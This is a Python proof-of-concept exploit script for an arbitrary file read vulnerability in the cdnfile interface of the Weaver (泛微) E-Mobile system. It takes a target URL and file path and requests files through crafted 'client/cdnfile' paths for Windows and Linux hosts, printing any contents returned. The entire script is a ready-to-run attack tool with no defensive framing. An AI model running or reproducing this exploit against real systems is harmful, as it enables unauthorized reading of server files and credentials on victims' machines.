import requests
import argparse
ASCII_ART=r'''
       _                                           
 __  _| | ___   _ _ __   ___      _ __   ___   ___ 
 \ \/ / |/ / | | | '_ \ / _ \    | '_ \ / _ \ / __|
  >  <|   <| |_| | | | | (_) |   | |_) | (_) | (__ 
 /_/\_\_|\_\\__,_|_| |_|\___/____| .__/ \___/ \___|
                           |_____|_|               
'''
def parse_arguments():
    parser = argparse.ArgumentParser(description="泛微E-Mobile系统接口cdnfile存在任意文件读取漏洞")
    parser.add_argument('-t', '--target', type=str, required=True,
                        help="请输入目标(http://example.com/)")
    parser.add_argument('-f', '--file', type=str, default="Windows/win.ini",
                        help="指定目标文件 (默认为 Windows/win.ini)")
    return parser.parse_args()

def win(url, file, headers):
    try:
        response = requests.get(url + 'client/cdnfile/1C/' + file + '?windows', headers=headers, verify=False)
        if response.status_code == 200:
            print(f"[+] Windows 文件读取成功:\n{response.text}")
            return True
    except Exception as e:
        print(f"[-] Windows 请求失败: {e}")
    return False

def linux(url, file, headers):
    try:
        response = requests.get(url + 'client/cdnfile/C/' + file + '?linux', headers=headers, verify=False)
        if response.status_code == 200:
            print(f"[+] Linux 文件读取成功:\n{response.text}")
            return True
    except Exception as e:
        print(f"[-] Linux 请求失败: {e}")
    return False

if __name__ == "__main__":
    print(ASCII_ART)
    print("泛微E-Mobile系统接口cdnfile存在任意文件读取漏洞")
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }

    arg = parse_arguments()

    # 检查目标网站是否提供
    if not arg.target:
        print("请输入您的目标网站")
        exit()

    # 分别检查 Windows 和 Linux
    windows_vulnerable = win(arg.target, arg.file, headers)
    linux_vulnerable = linux(arg.target, arg.file, headers)

    if not windows_vulnerable and not linux_vulnerable:
        print("未发现漏洞")
